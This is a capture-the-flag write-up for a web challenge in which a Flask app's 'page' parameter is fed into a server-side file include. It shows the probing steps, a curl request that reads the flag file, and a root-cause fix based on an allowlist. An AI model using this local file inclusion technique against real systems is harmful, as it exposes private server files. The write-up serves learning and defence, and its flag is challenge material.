# Sneaky Includes

- **Category:** web
- **Points:** 150
- **Target:** http://54.72.82.22:8030
- **Status:** ✅ SOLVED
- **Flag:** `safctf{9fdb535dbf8020d488bf8d6a51287778}`

## Observations

Werkzeug/3.1.9 (Python 3.10) Flask app, "Quiet Grove" theme. The index body
contains a planted hint:

```html
... they had <b>/health.</b>
```

`/health` returns 200 with a 2-byte body. Probing parameters, every unknown
param echoed the full 8429-byte index page — except `page=`, which returned a
short 59-byte body:

```html
<h2>Oops! Something went wrong while loading the page.</h2>
```

So `page` is an include path that failed. The error is swallowed, which makes
this a blind-ish LFI: we only learn success vs. failure from the response.

## Exploit

Walk the include path until the flag file resolves. Relative `flag.txt` and
absolute `/flag.txt` both work:

```sh
curl 'http://54.72.82.22:8030/?page=flag.txt'
```

```
safctf{9fdb535dbf8020d488bf8d6a51287778}
```

Note `../flag.txt` returns the error body while plain `flag.txt` succeeds — the
working directory is already the flag's directory, and traversal is filtered.

## Root cause / fix

User input is concatenated straight into a server-side file include with no
allowlist. Fix: map an explicit dict of allowed page names
(`{"about": "about.html", ...}`) and never pass user input to the filesystem;
if that is unavoidable, resolve the final path and assert it stays inside a
fixed base directory.

## Reproduction

```sh
.venv/bin/python chal/web/sneaky-includes/solve.py
```
